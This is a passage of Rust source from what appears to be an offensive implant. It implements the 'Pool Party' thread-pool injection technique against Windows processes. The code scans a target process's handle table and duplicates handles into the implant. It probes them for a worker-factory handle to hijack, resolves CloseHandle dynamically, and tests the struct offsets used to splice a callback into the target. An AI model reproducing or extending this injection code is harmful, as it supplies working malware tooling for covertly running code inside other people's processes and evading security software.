    const ENTRY_HANDLE_OFF: usize = 0x08;
    const ENTRY_PID_OFF: usize = 0x20;

    if buf.len() < COUNT_OFF + core::mem::size_of::<u32>() {
        return Err(String::from("hijack: handle table truncated"));
    }
    let count = unsafe {
        (buf.as_ptr().add(COUNT_OFF) as *const u32).read_unaligned()
    };
    let max_entries = (buf.len().saturating_sub(HANDLES_OFF)) / ENTRY_STRIDE;
    let count = if (count as usize) > max_entries {
        max_entries
    } else {
        count as usize
    };

    for i in 0..count {
        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
        if entry + ENTRY_STRIDE > buf.len() {
            break;
        }
        let pid = unsafe {
            (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u32).read_unaligned()
        };
        if pid != target_pid {
            continue;
        }
        let handle_val = unsafe {
            (buf.as_ptr().add(entry + ENTRY_HANDLE_OFF) as *const usize).read_unaligned()
        };
        if handle_val == 0 || handle_val == (-1isize) as usize {
            continue;
        }

        // Duplicate this handle into the implant with DUPLICATE_SAME_ACCESS.
        let mut dup: *mut c_void = core::ptr::null_mut();
        let ok = unsafe {
            dup_handle(
                target_h,
                handle_val as *mut c_void,
                CUR_PROCESS,
                core::ptr::addr_of_mut!(dup),
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            )
        };
        if ok == 0 || dup.is_null() {
            // Not duplicatable (access denied, or wrong object type) — skip.
            continue;
        }

        // Probe: is this duplicate a worker factory?
        // NtQueryInformationWorkerFactory returns STATUS_OBJECT_TYPE_MISMATCH
        // (0xC0000024) for non-worker-factory handles; STATUS_SUCCESS for a
        // real one. A tiny stack buffer is enough for the basic-timer query.
        let mut probe: [u8; 32] = [0u8; 32];
        let mut probe_len: u32 = 0;
        let qst = unsafe {
            query_wf(
                dup,
                WORKER_FACTORY_BASIC_TIMER,
                probe.as_mut_ptr() as *mut c_void,
                probe.len() as u32,
                &mut probe_len,
            )
        };
        if qst >= 0 {
            // Hit — this is a worker-factory handle owned by the target.
            return Ok(dup);
        }
        // Not a worker factory; close the duplicate and keep scanning.
        unsafe { close_handle(dup) };
    }

    Err(String::from(
        "hijack: target has no worker-factory handle (no TP worker?)",
    ))
}

/// Close a kernel handle best-effort. Resolves `kernel32!CloseHandle` lazily
/// (once per call — cheap relative to a syscall) and swallows failure: a leaked
/// handle is benign for a single-shot inject and a failure here must not mask
/// the real error from the caller.
///
/// # Safety
/// `h` must be a valid handle owned by the current process (either opened by it
/// or duplicated into it). Closing an unknown handle is a no-op at worst.
unsafe fn close_handle(h: *mut c_void) {
    if h.is_null() {
        return;
    }
    if let Some(addr) = resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        let close: unsafe extern "system" fn(*mut c_void) -> i32 =
            unsafe { core::mem::transmute(addr) };
        unsafe { close(h) };
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pool_party_default_off() {
        // Unless the build set NYX_POOL_PARTY_ON=1, the gate is OFF.
        assert!(!pool_party_enabled());
    }

    #[test]
    fn gate_round_trips() {
        let prev = set_pool_party_enabled(true);
        assert!(pool_party_enabled());
        set_pool_party_enabled(prev); // restore
    }

    /// The TP_DIRECT_CALLBACK_OFFSET must match the `callback` field offset.
    #[test]
    fn callback_offset_matches_struct() {
        let off = core::mem::offset_of!(TpDirect, callback);
        assert_eq!(off, TP_DIRECT_CALLBACK_OFFSET);
    }

    /// The TP_WORK_DIRECT_OFFSET must match the `direct` field offset — this
    /// is the field the scheduler dereferences to find the `_TP_DIRECT`
    /// (and hence the callback). A drift here breaks the splice silently.
    #[test]
    fn work_direct_offset_matches_struct() {
        let off = core::mem::offset_of!(TpWork, direct);
        assert_eq!(off, TP_WORK_DIRECT_OFFSET);
    }

    /// The structs must be their documented sizes so the raw byte buffers
    /// written across the process boundary match the on-target layout.
    #[test]
    fn tp_struct_sizes_match_layout() {
        assert_eq!(core::mem::size_of::<TpDirect>(), TP_DIRECT_SIZE);
        assert_eq!(core::mem::size_of::<TpWork>(), TP_WORK_SIZE);
    }
}
